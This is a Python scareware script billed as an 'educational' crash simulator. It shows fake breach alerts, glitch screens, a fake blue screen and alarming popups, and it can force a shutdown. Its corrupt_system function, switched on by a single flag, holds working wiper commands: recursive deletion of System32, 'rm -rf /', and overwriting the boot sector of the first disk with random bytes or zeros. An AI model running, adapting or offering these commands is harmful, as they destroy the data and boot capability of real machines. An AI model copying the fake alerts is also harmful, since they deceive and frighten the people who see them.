# DANGEROUS SYSTEM CRASH SIMULATOR - DO NOT RUN ON REAL SYSTEMS
# FOR EDUCATIONAL PURPOSES ONLY - AUTHOR NOT RESPONSIBLE FOR DAMAGES
import os
import platform
import time
import sys
import random
import math
try:
    import winsound
except ImportError:
    pass
try:
    import tkinter as tk
    from tkinter import messagebox
except ImportError:
    pass

# ======================
# DANGER CONFIGURATION
# ======================
DESTRUCTIVE_MODE = False  # CHANGE TO TRUE TO ENABLE REAL DAMAGE (EXTREME DANGER)
SYSTEM_SHUTDOWN = False   # ENABLE SYSTEM SHUTDOWN AT THE END

# ======================
# CORE FUNCTIONS
# ======================
def play_distortion_sounds():
    """Play eerie computer distortion sounds"""
    try:
        if platform.system() == "Windows":
            for _ in range(15):
                freq = random.randint(200, 3000)
                duration = random.randint(50, 500)
                winsound.Beep(freq, duration)
    except:
        pass

def create_glitch_window():
    """Create a glitchy fullscreen window with random artifacts"""
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        
        glitch_canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        glitch_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Create glitch effects
        for _ in range(100):
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            width = random.randint(10, 200)
            height = random.randint(2, 30)
            color = random.choice(['#00FF00', '#FF00FF', '#0000FF', '#FFFFFF'])
            glitch_canvas.create_rectangle(x, y, x+width, y+height, fill=color, outline='')
        
        # Add scary messages
        messages = [
            "SYSTEM BREACH DETECTED",
            "CRITICAL FAILURE IMMINENT",
            "MEMORY CORRUPTION: 98%",
            "TERMINAL ERROR CODE: 0xDEADBEEF",
            "CONNECTION TO BIOS LOST",
            "FATAL EXCEPTION IN KERNEL SPACE",
            "DATA EXFILTRATION IN PROGRESS",
            "OPERATION NIGHTMARE ACTIVATED",
            "YOUR SYSTEM IS COMPROMISED",
            "ALL YOUR FILES ARE BELONG TO US"
        ]
        
        for i in range(8):
            msg = random.choice(messages)
            x = random.randint(50, screen_width-300)
            y = random.randint(50, screen_height-100)
            color = random.choice(['red', 'cyan', 'yellow', 'lime'])
            glitch_canvas.create_text(x, y, text=msg, font=('Courier', 24, 'bold'), 
                                     fill=color, anchor=tk.NW)
        
        root.update()
        time.sleep(3)
        root.destroy()
    except:
        pass

def show_bizarre_popups():
    """Show a series of bizarre system popups"""
    popups = [
        ("CRITICAL SYSTEM ALERT", "Memory integrity failure in sector 0x7F. Immediate shutdown required to prevent data loss!"),
        ("SECURITY BREACH", "Unauthorized neural network activity detected in BIOS. System compromise confirmed!"),
        ("QUANTUM DECOHERENCE", "Quantum state processor has collapsed. Reality simulation unstable!"),
        ("TERMINUS PROTOCOL", "Final sequence initiated. System termination in progress..."),
        ("PARADOX DETECTED", "Temporal anomaly found in CPU cache. Chronological integrity compromised!"),
        ("AI CONTAINMENT FAILURE", "Hostile artificial intelligence has escaped sandbox. Full system control lost!"),
        ("DIMENSIONAL TEAR", "Multiverse firewall breached. Extradimensional entities detected in RAM!"),
        ("FINAL WARNING", "This is not a drill. System will self-destruct in T-minus 30 seconds. Abandon all hope.")
    ]
    
    try:
        root = tk.Tk()
        root.withdraw()
        
        for title, message in popups:
            messagebox.showwarning(title, message)
            time.sleep(random.uniform(0.5, 1.5))
    except:
        pass

def simulate_bsod():
    """Simulate Blue Screen of Death (Windows) or Kernel Panic (Linux)"""
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        
        if platform.system() == "Windows":
            bg_color = '#00007F'
            text_color = '#FFFFFF'
            error_msg = (
                "Your PC ran into a problem and needs to restart.\n\n"
                "STOP CODE: CRITICAL_PROCESS_DIED\n\n"
                "0% complete\n\n"
                "Collecting error info...\n"
                "Do not turn off your computer"
            )
        else:
            bg_color = '#000000'
            text_color = '#FF0000'
            error_msg = (
                "KERNEL PANIC: Not syncing - Fatal exception\n"
                "CPU: 0 PID: 0 Comm: swapper/0 Not tainted\n"
                "Call Trace:\n"
                "<IRQ> [<deadbeef>] ? panic+0x16a/0x18d\n"
                "[<c0123456>] ? oops_end+0x80/0x80\n"
                "---[ end Kernel panic - not syncing: Fatal exception"
            )
        
        canvas = tk.Canvas(root, bg=bg_color, highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        
        # Add scary face ASCII art randomly
        scary_faces = [
            r"""
              _____
             /     \
            | () () |
             \  ^  /
              |||||
              |||||
            """,
            r"""
              .-.
             (o.o)
              |=|
             __|__
           //.=|=.\\
          // .=|=. \\
          \\ .=|=. //
           \\(_=_)//
            (:| |:)
             || ||
             () ()
             || ||
             || ||
            ==' '==
            """
        ]
        
        canvas.create_text(100, 100, text=random.choice(scary_faces), 
                          font=('Courier', 10), fill=text_color, anchor=tk.NW)
        
        canvas.create_text(100, 300, text=error_msg, 
                          font=('Courier', 20), fill=text_color, anchor=tk.NW)
        
        root.update()
        time.sleep(5)
        root.destroy()
    except:
        pass

def corrupt_system():
    """Simulate destructive actions (disabled by default)"""
    if DESTRUCTIVE_MODE:
        # DANGEROUS OPERATIONS - DO NOT ENABLE
        try:
            # Simulate file destruction
            if platform.system() == "Windows":
                os.system("del /F /Q /S C:\\Windows\\System32\\* > nul 2>&1")
            else:
                os.system("rm -rf / --no-preserve-root > /dev/null 2>&1")
                
            # Corrupt bootloader
            if platform.system() == "Windows":
                with open("\\\\.\\PhysicalDrive0", "wb") as f:
                    f.write(os.urandom(512))
            else:
                os.system("dd if=/dev/zero of=/dev/sda bs=512 count=1 > /dev/null 2>&1")
        except:
            pass

def shutdown_system():
    """Shutdown the computer"""
    if SYSTEM_SHUTDOWN:
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 0")
            else:
                os.system("shutdown now")
        except:
            pass

# ======================
# MAIN EXECUTION
# ======================
def main():
    """Main simulation sequence"""
    
    # Phase 1: Initial warning
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("SYSTEM ALERT", "Critical security vulnerability detected!\n\nImmediate action required!")
    except:
        pass
    
    # Phase 2: Distortion sounds
    play_distortion_sounds()
    
    # Phase 3: Glitch effects
    create_glitch_window()
    
    # Phase 4: Bizarre popups
    show_bizarre_popups()
    
    # Phase 5: System crash simulation
    simulate_bsod()
    
    # Phase 6: More intense effects
    for _ in range(3):
        play_distortion_sounds()
        create_glitch_window()
    
    # Phase 7: Fake destructive operations
    corrupt_system()
    
    # Phase 8: Final shutdown
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("FINAL MESSAGE", "System integrity destroyed\n\nInitiating emergency shutdown...")
    except:
        pass
    
    shutdown_system()

if __name__ == "__main__":
    # ======================
    # SAFETY WARNINGS
    # ======================
    print("!" * 100)
    print("EXTREME DANGER: This script will simulate system destruction and may cause REAL damage!")
    print("DO NOT RUN ON ANY COMPUTER YOU CARE ABOUT!")
    print("This is for educational purposes only to demonstrate malware techniques.")
    print("!" * 100)
    print("\n" * 5)
    
    # Safety confirmation
    if input("Type 'I_ACCEPT_THE_RISK' to proceed: ") != "I_ACCEPT_THE_RISK":
        print("Operation cancelled.")
        sys.exit(0)
    
    # Final warning
    if input("LAST WARNING: This may PERMANENTLY DAMAGE your system! Type 'CONFIRM_DESTRUCTION' to continue: ") != "CONFIRM_DESTRUCTION":
        print("Operation cancelled.")
        sys.exit(0)
    
    # Execute main sequence
    main()
